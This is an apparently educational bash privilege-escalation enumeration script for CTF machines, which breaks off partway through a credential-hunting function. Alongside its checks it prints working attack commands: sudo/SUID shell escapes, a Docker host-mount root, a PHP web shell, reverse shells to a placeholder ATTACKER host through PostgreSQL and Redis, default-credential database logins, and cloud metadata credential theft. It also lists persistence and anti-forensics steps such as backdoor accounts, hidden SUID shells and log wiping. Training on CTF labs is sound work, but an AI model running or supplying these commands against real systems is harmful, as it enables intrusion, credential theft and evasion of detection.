#!/bin/bash
# TeachPEAS - The Red Team's Privilege Escalation Bible
# Comprehensive enumeration + education for HTB/THM environments

set -o pipefail

# === COLORS ===
R='\033[31m' G='\033[32m' Y='\033[33m' B='\033[34m' 
P='\033[35m' C='\033[36m' W='\033[37m' RST='\033[0m'
# Critical alert colors (red background + white text for maximum visibility)
CRIT='\033[41m\033[1;97m'

# === CONFIGURATION ===
VERBOSE=0
EXPLAIN=1
QUICK_MODE=0
EXTENDED=1  # Extended checks (databases, web, post-exploit)
LOG_FILE="/tmp/teachpeas_$(date +%s).log"

# === LOGGING ===
log() { echo -e "$1" | tee -a "$LOG_FILE"; }
section() { log "\n${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}\n${C}$1${RST}\n${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}"; }
vuln() { log "${R}[VULNERABLE]${RST} $1"; }
info() { log "${B}[INFO]${RST} $1"; }
ok() { log "${G}[OK]${RST} $1"; }
warn() { log "${Y}[WARNING]${RST} $1"; }
teach() { [ $EXPLAIN -eq 1 ] && log "${Y}[LEARN]${RST} $1"; }
critical() { log "${CRIT}[!!! CRITICAL !!!]${RST} $1"; }

# === EDUCATIONAL FRAMEWORK ===
explain_concept() {
    local title="$1"
    local what="$2"
    local why="$3"
    local how="$4"
    
    [ $EXPLAIN -eq 0 ] && return
    
    log "\n${P}╔═══════════════════════════════════════╗${RST}"
    log "${P}║  UNDERSTANDING: $title"
    log "${P}╚═══════════════════════════════════════${RST}"
    log "${W}WHAT:${RST} $what"
    log "${W}WHY IT MATTERS:${RST} $why"
    log "${W}HOW TO EXPLOIT:${RST} $how"
    log ""
}

# === SYSTEM FINGERPRINT ===
enum_system() {
    section "SYSTEM FINGERPRINT"
    
    local os=$(grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d'"' -f2 || echo "Unknown")
    local kernel=$(uname -r)
    local arch=$(uname -m)
    local hostname=$(hostname)
    
    info "OS: $os"
    info "Kernel: $kernel"
    info "Architecture: $arch"
    info "Hostname: $hostname"
    info "Current User: $(whoami)"
    info "User ID: $(id)"
    
    teach "System fingerprinting reveals:"
    teach "  • Kernel version → CVE lookup on exploit-db"
    teach "  • OS distribution → Default package configurations"
    teach "  • Architecture → Binary compatibility (x86_64, i386, ARM)"
    teach "  • User groups → Special privileges (docker, lxd, disk, etc.)"
}

# === NETWORK INFORMATION ===
enum_network() {
    section "NETWORK CONFIGURATION"
    
    info "Network interfaces:"
    ip addr 2>/dev/null || ifconfig 2>/dev/null | grep -E "inet |UP" | head -10
    
    info "Active connections:"
    netstat -tuln 2>/dev/null | grep LISTEN | head -10 || ss -tuln 2>/dev/null | head -10
    
    teach "Network enumeration helps identify:"
    teach "  • Internal services not exposed externally"
    teach "  • Database ports (3306, 5432, 27017)"
    teach "  • Docker API (2375, 2376)"
    teach "  • Other pivot opportunities"
    
    # Check for Docker socket
    if [ -S /var/run/docker.sock ]; then
        critical "Docker socket accessible - Mount host filesystem: docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
        vuln "Docker socket is accessible!"
        explain_concept "Docker Socket Exploitation" \
            "The Docker socket (/var/run/docker.sock) allows full control of Docker daemon. Access to it = root." \
            "Docker runs as root. Anyone who can communicate with the Docker API can spawn containers with root privileges and mount the host filesystem." \
            "Exploit:\n  docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash\n  This mounts the entire host filesystem to /mnt in container, then chroots into it."
    fi
}

# === USER ENUMERATION ===
enum_users() {
    section "USER ENUMERATION"
    
    info "Interactive users (UID >= 1000):"
    awk -F: '$3 >= 1000 && $1 != "nobody" {print "  " $1 " (UID: " $3 ")"}' /etc/passwd
    
    info "Users with shells:"
    grep -E "/(bash|sh|zsh|fish)$" /etc/passwd | cut -d: -f1 | while read u; do
        log "  $u"
    done
    
    # Check for sudo group members
    if getent group sudo >/dev/null 2>&1; then
        info "Members of sudo group:"
        getent group sudo | cut -d: -f4 | tr ',' '\n' | while read u; do
            log "  $u"
        done
    fi
    
    teach "User enumeration reveals:"
    teach "  • Potential lateral movement targets"
    teach "  • Users with sudo access (sudo group)"
    teach "  • Service accounts vs. real users"
}

# === SUDO ANALYSIS ===
enum_sudo() {
    section "SUDO PERMISSIONS ANALYSIS"
    
    local sudo_output=$(sudo -l 2>&1)
    
    if echo "$sudo_output" | grep -qi "not allowed\|password.*incorrect"; then
        ok "No sudo access or incorrect password"
        return
    fi
    
    # Check for dangerous sudo ALL with NOPASSWD
    if echo "$sudo_output" | grep -qE '\(ALL\s*:\s*ALL\)\s*NOPASSWD.*ALL'; then
        critical "FULL SUDO NOPASSWD - Instant root: sudo /bin/bash"
        vuln "FULL SUDO ACCESS (ALL : ALL) NOPASSWD: ALL"
        explain_concept "Unrestricted Sudo NOPASSWD" \
            "You can run ANY command as ANY user without a password." \
            "This is root access with zero barriers. Just run any command with sudo." \
            "Exploitation: sudo /bin/bash"
    # Check for dangerous sudo ALL (with password)
    elif echo "$sudo_output" | grep -qE '\(ALL\s*:\s*ALL\)\s*ALL'; then
        critical "FULL SUDO ACCESS - Root with password: sudo /bin/bash"
        vuln "FULL SUDO ACCESS (ALL : ALL) ALL"
        explain_concept "Unrestricted Sudo" \
            "You can run ANY command as ANY user without restriction." \
            "This is essentially root access. The only barrier is your password (if required). This exists because an admin gave you blanket permissions, likely for convenience or automation." \
            "If NOPASSWD: just run 'sudo /bin/bash'\nIf password required: Try default passwords (password, admin, username), credential stuffing from other services, or password guessing."
    fi
    
    # Check for NOPASSWD
    if echo "$sudo_output" | grep -q "NOPASSWD"; then
        vuln "NOPASSWD sudo entries found"
        explain_concept "NOPASSWD Sudo" \
            "Certain commands can be run as root without entering a password." \
            "The system trusts your user identity completely for these commands. If any of these binaries can spawn a shell or write files, you can escalate. This exists because admins want automation without password prompts (cron jobs, scripts)." \
            "Steps:\n  1. Identify which binaries have NOPASSWD\n  2. Check GTFOBins (gtfobins.github.io) for that binary\n  3. Look for 'sudo' section\n  4. Common exploitable: vim, find, python, bash, less, more, awk, perl"
        
        log "${Y}Specific NOPASSWD entries:${RST}"
        echo "$sudo_output" | grep "NOPASSWD" | while read line; do
            log "  $line"
            
            # Extract binary name and provide specific guidance
            local bin=$(echo "$line" | grep -oE '[^ ]+$' | xargs basename 2>/dev/null)
            case $bin in
                vim|vi)
                    critical "NOPASSWD vim/vi - Instant root: sudo vim -c ':!/bin/sh'"
                    teach "  → sudo vim -c ':!/bin/sh'"
                    ;;
                nano)
                    critical "NOPASSWD nano - Instant root: sudo nano then ^R^X reset; /bin/sh"
                    teach "  → sudo nano, then ^R^X reset; /bin/sh"
                    ;;
                emacs)
                    teach "  → sudo emacs --eval '(term \"/bin/sh\")'"
                    ;;
                less|more)
                    critical "NOPASSWD less/more - Instant root: sudo less /etc/profile then !sh"
                    teach "  → sudo less /etc/profile, then !sh"
                    ;;
                find)
                    critical "NOPASSWD find - Instant root: sudo find . -exec /bin/sh \\; -quit"
                    teach "  → sudo find . -exec /bin/sh \\; -quit"
                    ;;
                xargs)
                    teach "  → sudo xargs -a /dev/null sh"
                    ;;
                awk|gawk|nawk)
                    critical "NOPASSWD awk - Instant root: sudo awk 'BEGIN {system(\"/bin/sh\")}'"
                    teach "  → sudo awk 'BEGIN {system(\"/bin/sh\")}'"
                    ;;
                python*|perl|ruby|node)
                    critical "NOPASSWD $bin - Instant root: sudo $bin -c 'import os; os.system(\"/bin/sh\")'"
                    teach "  → sudo $bin -c 'import os; os.system(\"/bin/sh\")'"
                    ;;
                bash|sh|zsh|dash)
                    critical "NOPASSWD shell - Instant root: sudo $bin"
                    teach "  → sudo $bin (it's literally a shell)"
                    ;;
                env)
                    critical "NOPASSWD env - Instant root: sudo env /bin/sh"
                    teach "  → sudo env /bin/sh"
                    ;;
                git)
                    teach "  → sudo git help status (spawns pager, then !sh)"
                    ;;
                tar)
                    teach "  → sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
                    ;;
                zip)
                    teach "  → sudo zip /tmp/x.zip /etc/hosts -T -TT 'sh #'"
                    ;;
                mysql)
                    teach "  → sudo mysql -e '\\! /bin/sh'"
                    ;;
                *)
                    teach "  → Check GTFOBins for: $bin"
                    ;;
            esac
        done
    fi
    
    # Check for environment variable preservation
    if echo "$sudo_output" | grep -q "env_keep"; then
        vuln "Sudo preserves environment variables"
        teach "env_keep allows you to preserve environment variables when using sudo"
        teach "  This can be exploited with LD_PRELOAD or LD_LIBRARY_PATH"
        teach "  Create malicious library, set LD_PRELOAD, run sudo command"
    fi
}

# === SUID BINARY ANALYSIS ===
enum_suid() {
    section "SUID BINARY ANALYSIS"
    
    explain_concept "SUID Bit" \
        "SUID (Set User ID) allows a program to run with the file owner's privileges. If owner is root, program runs as root regardless of who executes it." \
        "Legitimate use: /usr/bin/passwd needs root to modify /etc/shadow. Dangerous: Custom SUID binaries may have vulnerabilities, call other programs unsafely, or have shell escape features." \
        "Attack vectors:\n  1. Binary spawns a shell directly\n  2. Binary calls other programs without absolute paths (PATH hijacking)\n  3. Binary has buffer overflow or other memory corruption\n  4. Binary has command injection vulnerability"
    
    # Known legitimate SUID binaries (expanded for modern systems)
    local legit_suid=(
        "/usr/bin/passwd" "/usr/bin/sudo" "/usr/bin/su"
        "/usr/bin/mount" "/usr/bin/umount" "/usr/bin/chsh"
        "/usr/bin/chfn" "/usr/bin/gpasswd" "/usr/bin/newgrp"
        "/bin/ping" "/bin/ping6" "/usr/bin/pkexec"
        "/usr/bin/fusermount" "/usr/lib/openssh/ssh-keysign"
        "/bin/su" "/bin/mount" "/bin/umount" "/bin/fusermount"
        "/bin/ntfs-3g" "/usr/bin/newuidmap" "/usr/bin/newgidmap"
        "/usr/bin/at" "/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic"
        "/usr/lib/dbus-1.0/dbus-daemon-launch-helper"
        "/usr/lib/snapd/snap-confine"
        "/usr/lib/policykit-1/polkit-agent-helper-1"
        "/usr/lib/eject/dmcrypt-get-device"
    )
    
    local found_interesting=0
    
    find / -perm -4000 -type f 2>/dev/null | while read suid_bin; do
        local is_legit=0
        
        for legit in "${legit_suid[@]}"; do
            [ "$suid_bin" = "$legit" ] && is_legit=1 && break
        done
        
        if [ $is_legit -eq 0 ]; then
            vuln "Non-standard SUID binary: $suid_bin"
            found_interesting=1
            
            local owner=$(stat -c %U "$suid_bin" 2>/dev/null)
            local perms=$(stat -c %a "$suid_bin" 2>/dev/null)
            
            log "    Owner: $owner | Permissions: $perms"
            
            # Analyze what it does
            local file_type=$(file "$suid_bin" 2>/dev/null)
            if echo "$file_type" | grep -q "script"; then
                warn "    This is a script with SUID - scripts ignore SUID on most systems"
                teach "    However, check if it calls other binaries you can manipulate"
            fi
            
            # Check if it's a known exploitable binary
            local basename=$(basename "$suid_bin")
            case $basename in
                nmap)
                    critical "SUID nmap - Instant root: nmap --interactive then !sh"
                    teach "  → nmap --interactive → !sh (older versions)"
                    ;;
                vim|vi)
                    critical "SUID vim - Instant root: vim -c ':!/bin/sh -p'"
                    teach "  → vim -c ':!/bin/sh -p'"
                    ;;
                nano)
                    teach "  → nano, then ^R^X reset; sh -p"
                    ;;
                find)
                    critical "SUID find - Instant root: find . -exec /bin/sh -p \\; -quit"
                    teach "  → find . -exec /bin/sh -p \\; -quit"
                    ;;
                python*|perl|ruby|node)
                    critical "SUID $basename - Instant root: $basename -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
                    teach "  → $basename -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
                    ;;
                bash|sh|zsh|dash)
                    critical "SUID shell - Instant root: $suid_bin -p"
                    teach "  → $suid_bin -p (preserves privileges)"
                    ;;
                cp)
                    teach "  → Copy /etc/shadow: cp /etc/shadow /tmp/shadow"
                    ;;
                mv)
                    teach "  → Move sensitive files to readable location"
                    ;;
                base64)
                    teach "  → base64 /etc/shadow | base64 --decode"
                    ;;
                *)
                    teach "  → Analysis steps:"
                    teach "      strings $suid_bin | grep -E 'system|exec|popen'"
                    teach "      ltrace $suid_bin 2>&1 | grep -E 'system|exec'"
                    teach "      Check GTFOBins for: $basename"
                    ;;
            esac
        fi
    done
    
    [ $found_interesting -eq 0 ] && ok "Only standard SUID binaries found"
}

# === SGID BINARIES ===
enum_sgid() {
    section "SGID BINARY ANALYSIS"
    
    explain_concept "SGID Bit" \
        "SGID (Set Group ID) is like SUID but for groups. The program runs with the file's group privileges." \
        "Less common than SUID for privilege escalation, but if SGID binary is in 'shadow' or 'docker' group, it can be exploited." \
        "Look for SGID binaries in privileged groups, then analyze like SUID binaries."
    
    find / -perm -2000 -type f 2>/dev/null | head -20 | while read sgid_bin; do
        local group=$(stat -c %G "$sgid_bin" 2>/dev/null)
        case $group in
            shadow|docker|disk|sudo)
                vuln "SGID binary in privileged group '$group': $sgid_bin"
                teach "  This binary runs with $group privileges"
                ;;
        esac
    done
}

# ═══════════════════════════════════════════════════
# EXTENDED MODULES (--extended flag)
# ═══════════════════════════════════════════════════

# === DATABASE ENUMERATION ===
enum_databases() {
    [ $EXTENDED -eq 0 ] && return
    
    section "DATABASE ENUMERATION"
    
    explain_concept "Database Privilege Escalation" \
        "Databases often run as root or privileged users. Weak credentials or UDF exploits can lead to command execution." \
        "MySQL/PostgreSQL allow file operations and command execution via User Defined Functions or built-in features. MariaDB/MySQL running as root + FILE privilege = read/write any file. PostgreSQL COPY FROM/TO can read/write files." \
        "Attack paths:\n  • Default credentials (root:root, root:password)\n  • Credentials in config files\n  • UDF exploitation for MySQL\n  • COPY FROM PROGRAM for PostgreSQL\n  • NoSQL injection for MongoDB"
    
    # Check for MySQL
    if command -v mysql >/dev/null 2>&1; then
        info "MySQL client is installed"
        
        # Try common credential combinations
        local mysql_creds=("root:" "root:root" "root:password" "root:toor")
        for cred in "${mysql_creds[@]}"; do
            local user=$(echo "$cred" | cut -d: -f1)
            local pass=$(echo "$cred" | cut -d: -f2)
            
            if [ -z "$pass" ]; then
                if mysql -u"$user" -e "SELECT 1" 2>/dev/null | grep -q "1"; then
                    critical "MySQL root access with NO PASSWORD - Instant privilege escalation possible"
                    vuln "MySQL accessible with no password: $user"
                    teach "Exploitation:"
                    teach "  mysql -u$user -e 'SELECT LOAD_FILE(\"/etc/shadow\")'"
                    teach "  Or use UDF to execute commands if running as root"
                fi
            else
                if mysql -u"$user" -p"$pass" -e "SELECT 1" 2>/dev/null | grep -q "1"; then
                    critical "MySQL root access with default password: $user:$pass"
                    vuln "MySQL accessible with default password: $user:$pass"
                fi
            fi
        done
        
        # Check for socket
        if [ -S /var/run/mysqld/mysqld.sock ]; then
            info "MySQL socket found at /var/run/mysqld/mysqld.sock"
            if [ -w /var/run/mysqld/mysqld.sock ]; then
                critical "MySQL socket is WRITABLE - Connect without credentials"
                vuln "MySQL socket is WRITABLE!"
                teach "Connect without credentials if file permissions allow"
            fi
        fi
    fi
    
    # Check for PostgreSQL
    if command -v psql >/dev/null 2>&1; then
        info "PostgreSQL client is installed"
        
        # Try connection
        if psql -U postgres -c "SELECT 1" 2>/dev/null | grep -q "1"; then
            critical "PostgreSQL accessible as postgres - Command execution via COPY TO PROGRAM"
            vuln "PostgreSQL accessible as postgres user"
            teach "PostgreSQL exploitation:"
            teach "  COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\"'"
            teach "  Or read files: CREATE TABLE temp(t TEXT); COPY temp FROM '/etc/passwd';"
        fi
    fi
    
    # Check for MongoDB
    if command -v mongo >/dev/null 2>&1 || command -v mongosh >/dev/null 2>&1; then
        info "MongoDB client is installed"
        warn "MongoDB often runs without authentication by default"
        teach "Try: mongo --eval 'db.version()'"
        teach "Then enumerate databases and collections"
    fi
    
    # Check for Redis
    if command -v redis-cli >/dev/null 2>&1; then
        info "Redis client is installed"
        if redis-cli ping 2>/dev/null | grep -q "PONG"; then
            critical "Redis accessible without auth - Write cron jobs or SSH keys"
            vuln "Redis is accessible without authentication!"
            explain_concept "Redis Exploitation" \
                "Redis is an in-memory database often used for caching. Unauthenticated access allows arbitrary command execution." \
                "Redis CONFIG SET allows changing server configuration, including setting the working directory and writing files. You can write SSH keys or cron jobs." \
                "Exploitation:\n  redis-cli config set dir /var/spool/cron/\n  redis-cli config set dbfilename root\n  redis-cli set x '\\n* * * * * /bin/bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\\n'\n  redis-cli save"
        fi
    fi
}

# === WEB APPLICATION ENUMERATION ===
enum_web() {
    [ $EXTENDED -eq 0 ] && return
    
    section "WEB APPLICATION ENUMERATION"
    
    explain_concept "Web Application Attacks" \
        "Web applications often store credentials, have writable directories, or run with elevated privileges." \
        "Common issues: hardcoded credentials in config files, writable web roots allowing shell upload, database credentials, API tokens, LFI/RFI vulnerabilities." \
        "Where to look:\n  • /var/www/html - Default web root\n  • /var/www - Alternative location\n  • /opt/* - Custom applications\n  • Look for: config.php, .env, wp-config.php, database.yml"
    
    # Check common web roots (deduplicated)
    local web_roots=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/opt")
    local checked_dirs=""
    
    for webroot in "${web_roots[@]}"; do
        # Skip if we've already checked this directory or its parent
        if echo "$checked_dirs" | grep -q "$webroot"; then
            continue
        fi
        
        if [ -d "$webroot" ]; then
            info "Found web directory: $webroot"
            checked_dirs="$checked_dirs $webroot"
            
            # Check if writable
            if [ -w "$webroot" ]; then
                critical "Web root WRITABLE - Upload shell: echo '<?php system(\$_GET[\"cmd\"]); ?>' > $webroot/shell.php"
                vuln "Web root is WRITABLE: $webroot"
                teach "You can upload a web shell:"
                teach "  echo '<?php system(\$_GET[\"cmd\"]); ?>' > $webroot/shell.php"
                teach "  Then access: http://target/shell.php?cmd=id"
            fi
            
            # Look for config files (exclude samples and setup files)
            find "$webroot" -name "*.conf" -o -name "*.config" -o -name "*config*.php" -o -name ".env" 2>/dev/null | \
            grep -vE "sample|example|setup-config|default-" | head -10 | while read config; do
                if [ -r "$config" ]; then
                    info "Found config file: $config"
                    
                    if grep -iE "password|secret|key|token|api" "$config" 2>/dev/null | head -3 | grep -q "."; then
                        vuln "Config contains credentials: $config"
                        grep -iE "password|secret|key" "$config" 2>/dev/null | head -3 | while read line; do
                            log "  $line"
                        done
                    fi
                fi
            done
            
            # Check for WordPress (only if not already found)
            if [ -f "$webroot/wp-config.php" ] && ! echo "$checked_dirs" | grep -q "wp-config"; then
                vuln "WordPress installation found"
                teach "Extract DB credentials from wp-config.php"
                teach "  Check for define('DB_PASSWORD', 'xxxxx')"
                checked_dirs="$checked_dirs wp-config"
            fi
        fi
    done
    
    # Check for running web servers
    if netstat -tuln 2>/dev/null | grep -qE ":80 |:443 |:8080 "; then
        info "Web server is listening on common ports"
        teach "Enumerate the web application for:"
        teach "  • LFI: /index.php?page=../../../../etc/passwd"
        teach "  • RCE: Look for file upload, command injection"
        teach "  • SQLi: Test input fields and URL parameters"
    fi
}

# === POST-EXPLOITATION ===
enum_post_exploit() {
    [ $EXTENDED -eq 0 ] && return
    
    section "POST-EXPLOITATION OPPORTUNITIES"
    
    explain_concept "Post-Exploitation" \
        "After gaining initial access, establish persistence, gather credentials, and prepare for lateral movement." \
        "You might lose access (reboot, detection, session timeout). Persistence ensures you can return. Credentials enable lateral movement to other systems. Evidence should be minimized." \
        "Techniques:\n  • Backdoor accounts\n  • SSH key injection\n  • SUID shells\n  • Cron jobs\n  • Systemd services"
    
    # Check if we're root (for post-exploit suggestions)
    if [ $EUID -eq 0 ]; then
        info "Running as ROOT - post-exploitation options available"
        
        teach "Persistence techniques now available:"
        teach "  1. Add SSH key: echo 'YOUR_KEY' >> /root/.ssh/authorized_keys"
        teach "  2. Create SUID shell: cp /bin/bash /tmp/.hidden; chmod 4755 /tmp/.hidden"
        teach "  3. Add backdoor user: echo 'backdoor:\$1\$xyz\$HASH:0:0::/root:/bin/bash' >> /etc/passwd"
        teach "  4. Cron backdoor: echo '* * * * * root /tmp/.backdoor' >> /etc/crontab"
        
        teach "\nCredential harvesting:"
        teach "  • Dump /etc/shadow for offline cracking"
        teach "  • Extract SSH keys from /home/*/.ssh/"
        teach "  • Check browser saved passwords if GUI present"
        teach "  • Dump process memory for credentials: strings /proc/*/environ"
        
        teach "\nAnti-forensics:"
        teach "  • Clear logs: echo '' > /var/log/auth.log"
        teach "  • Clear history: history -c; rm ~/.bash_history"
        teach "  • Remove artifacts: rm /tmp/exploit*"
        
    else
        info "Not root yet - focus on privilege escalation first"
    fi
    
    # Network reconnaissance for lateral movement
    info "Internal network reconnaissance:"
    
    # Check for other hosts in ARP cache
    if command -v arp >/dev/null 2>&1; then
        local hosts=$(arp -a 2>/dev/null | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u | wc -l)
        if [ $hosts -gt 1 ]; then
            info "Found $hosts hosts in ARP cache"
            teach "Potential targets for lateral movement"
        fi
    fi
    
    # Check for SSH known_hosts
    find /home -name "known_hosts" 2>/dev/null | while read khosts; do
        if [ -r "$khosts" ]; then
            info "SSH known_hosts found: $khosts"
            teach "Contains previously accessed hosts - potential lateral movement targets"
        fi
    done
}

# === CTF FLAG HUNTING ===
enum_ctf_flags() {
    [ $EXTENDED -eq 0 ] && return
    
    section "CTF FLAG HUNTING"
    
    teach "Looking for common CTF flag patterns and locations..."
    
    # Common flag patterns
    local flag_patterns=(
        "flag{.*}"
        "HTB{.*}"
        "THM{.*}"
        "CTF{.*}"
        "FLAG{.*}"
    )
    
    info "Checking common flag file locations:"
    
    # Use find for proper file discovery (globs don't work in arrays)
    find /root -maxdepth 1 -name "root.txt" -o -name "flag.txt" -o -name "proof.txt" 2>/dev/null | while read flagfile; do
        if [ -r "$flagfile" ]; then
            critical "ROOT FLAG READABLE: $flagfile"
            vuln "ROOT FLAG FOUND: $flagfile"
            cat "$flagfile" 2>/dev/null
        else
            warn "Root flag exists but not readable: $flagfile"
            teach "Get root to read this file"
        fi
    done
    
    find /home -maxdepth 2 -name "user.txt" -o -name "flag.txt" -o -name "local.txt" 2>/dev/null | while read flagfile; do
        if [ -r "$flagfile" ]; then
            critical "USER FLAG READABLE: $flagfile"
            vuln "USER FLAG FOUND: $flagfile"
            cat "$flagfile" 2>/dev/null
        else
            warn "User flag exists but not readable: $flagfile"
            teach "Escalate to user $(stat -c %U "$flagfile" 2>/dev/null) to read this"
        fi
    done
    
    find /var/www /opt -maxdepth 3 -name "*flag*" -o -name "*.txt" 2>/dev/null | while read flagfile; do
        if [ -r "$flagfile" ] && grep -qE "flag{|HTB{|THM{|CTF{|^[a-f0-9]{32}$" "$flagfile" 2>/dev/null; then
            vuln "FLAG FOUND: $flagfile"
            cat "$flagfile" 2>/dev/null
        fi
    done
    
    info "Searching for flag patterns in readable files:"
    for pattern in "${flag_patterns[@]}"; do
        grep -rE "$pattern" /home /var/www /opt /tmp 2>/dev/null | grep -vE "teachpeas|learnpeas|\.log:|\.sh:" | head -5 | while read match; do
            warn "Potential flag: $match"
        done
    done
    
    # Check current directory and common work directories
    if ls user.txt root.txt flag.txt 2>/dev/null | grep -q .; then
        critical "FLAG FILE IN CURRENT DIRECTORY!"
        vuln "Flag file in current directory!"
        cat user.txt root.txt flag.txt 2>/dev/null
    fi
    
    # Check for encoded flags
    info "Checking for base64-encoded flags:"
    find /home /var/www /opt -type f -readable 2>/dev/null | head -100 | while read file; do
        # Check if entire file is base64
        if [ $(wc -l < "$file" 2>/dev/null) -eq 1 ]; then
            local content=$(cat "$file" 2>/dev/null)
            if echo "$content" | grep -qE "^[A-Za-z0-9+/=]{20,}$"; then
                local decoded=$(echo "$content" | base64 -d 2>/dev/null)
                if echo "$decoded" | grep -qE "flag{|HTB{|THM{|^[a-f0-9]{32}$"; then
                    vuln "Base64-encoded flag in $file:"
                    echo "$decoded"
                fi
            fi
        fi
    done
    
    # Check environment variables for flags
    if env | grep -iE "flag|htb|thm" | grep -qv "EXTENDED"; then
        info "Flag-related environment variables:"
        env | grep -iE "flag|htb|thm" | grep -v "EXTENDED"
    fi
    
    teach "\nCTF-specific hiding places:"
    teach "  • Steganography in images (use steghide, binwalk)"
    teach "  • Hidden in EXIF data (use exiftool)"
    teach "  • Encoded in environment variables"
    teach "  • In database tables"
    teach "  • In git commit history (.git/logs/HEAD)"
    teach "  • Hidden with alternate data streams (NTFS)"
    teach "  • Inside zip/tar archives"
}

# === NETWORK PIVOTING ===
enum_pivoting() {
    [ $EXTENDED -eq 0 ] && return
    
    section "NETWORK PIVOTING SETUP"
    
    explain_concept "Network Pivoting" \
        "Use compromised host as a jump point to access internal networks not directly reachable from your attack machine." \
        "Many networks have an external-facing host (DMZ) and internal hosts. Once you compromise the DMZ host, you can tunnel through it to reach internal services. Essential for multi-host CTF challenges." \
        "Common techniques:\n  • SSH tunneling (local/remote port forwarding)\n  • Chisel (SOCKS proxy over HTTP)\n  • Ligolo-ng (modern tunneling)\n  • Metasploit autoroute"
    
    # Check if we can SSH out
    if command -v ssh >/dev/null 2>&1; then
        info "SSH client available for tunneling"
        teach "SSH tunneling options:"
        teach "  Local forward: ssh -L 8080:internal_host:80 user@pivot"
        teach "  Remote forward: ssh -R 9001:localhost:443 attacker@YOUR_IP"
        teach "  Dynamic (SOCKS): ssh -D 1080 user@pivot"
    fi
    
    # Check for internal networks
    ip addr 2>/dev/null | grep -oE "inet ([0-9]{1,3}\.){3}[0-9]{1,3}" | awk '{print $2}' | while read ip; do
        local network=$(echo $ip | cut -d. -f1-3)
        
        case $network in
            192.168.*|172.16.*|172.17.*|172.18.*|172.19.*|172.20.*|172.21.*|172.22.*|172.23.*|172.24.*|172.25.*|172.26.*|172.27.*|172.28.*|172.29.*|172.30.*|172.31.*|10.*)
                info "Internal network detected: $network.0/24"
                teach "Scan this network from the compromised host:"
                teach "  for i in {1..254}; do ping -c 1 $network.\$i &>/dev/null && echo \$network.\$i; done"
                ;;
        esac
    done
    
    # Check for proxychains config
    if [ -f /etc/proxychains.conf ] || [ -f ~/.proxychains/proxychains.conf ]; then
        info "Proxychains is configured"
        teach "Use proxychains to route tools through this host"
    fi
}

# ═══════════════════════════════════════════════════
# PHASE 1: HIGH-VALUE ADDITIONS
# ═══════════════════════════════════════════════════

# === CLOUD METADATA SERVICES ===
enum_cloud_metadata() {
    section "CLOUD METADATA SERVICE ENUMERATION"
    
    explain_concept "Cloud Instance Metadata" \
        "Cloud providers expose instance metadata via HTTP endpoint. Contains credentials, SSH keys, user-data scripts." \
        "Cloud instances need to query their own metadata for configuration. AWS uses 169.254.169.254, Azure uses similar. If you're on a cloud instance, this endpoint contains IAM credentials, API keys, bootstrap scripts with passwords." \
        "Access:\n  AWS: curl http://169.254.169.254/latest/meta-data/\n  Azure: curl -H 'Metadata:true' http://169.254.169.254/metadata/instance?api-version=2021-02-01\n  GCP: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/"
    
    # Check if we can reach cloud metadata
    if command -v curl >/dev/null 2>&1; then
        # AWS Check
        if timeout 2 curl -s -f http://169.254.169.254/latest/meta-data/ >/dev/null 2>&1; then
            critical "AWS METADATA ACCESSIBLE - Steal IAM credentials for cloud access"
            vuln "AWS EC2 Metadata Service is ACCESSIBLE!"
            info "Instance metadata available at: http://169.254.169.254/latest/meta-data/"
            
            teach "AWS Metadata exploitation:"
            teach "  1. Get IAM role: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            teach "  2. Get credentials: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
            teach "  3. Get user-data (bootstrap script): curl http://169.254.169.254/latest/user-data"
            teach "  4. Use credentials with AWS CLI for lateral movement"
            
            # Try to get actual creds
            local role=$(timeout 2 curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
            if [ -n "$role" ]; then
                critical "IAM Role found: $role - Extract credentials immediately"
                vuln "IAM Role found: $role"
                teach "Retrieve credentials: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$role"
            fi
        fi
        
        # Azure Check
        if timeout 2 curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | grep -q "compute"; then
            critical "Azure metadata accessible - Extract managed identity tokens"
            vuln "Azure Instance Metadata Service is ACCESSIBLE!"
            teach "Azure Metadata exploitation:"
            teach "  curl -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'"
            teach "  May contain managed identity tokens"
        fi
        
        # GCP Check
        if timeout 2 curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/" 2>/dev/null | grep -q "."; then
            critical "GCP metadata accessible - Extract service account tokens"
            vuln "GCP Metadata Service is ACCESSIBLE!"
            teach "GCP Metadata exploitation:"
            teach "  curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/"
            teach "  Get service account token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        fi
    else
        info "curl not available - cannot check cloud metadata"
    fi
}

# === LANGUAGE-SPECIFIC CREDENTIAL HUNTING ===
enum_language_creds() {
    section "LANGUAGE-SPECIFIC CREDENTIAL DISCOVERY"
    
    explain_concept "Framework Credentials" \
        "Modern web frameworks store credentials in .env files, config files, or package managers. These are often readable and contain database passwords, API keys, secret keys." \
        "Developers use environment variables for configuration (12-factor app methodology). .env files, package.json, composer.json, Gemfiles all can contain secrets. Left readable by accident or misconfiguration." \
        "Common locations:\n  • .env (all frameworks)\n  • package.json (Node.js)\n  • composer.json (PHP)\n  • requirements.txt (Python)\n  • Gemfile (Ruby)\n  • appsettings.json (ASP.NET)"
    
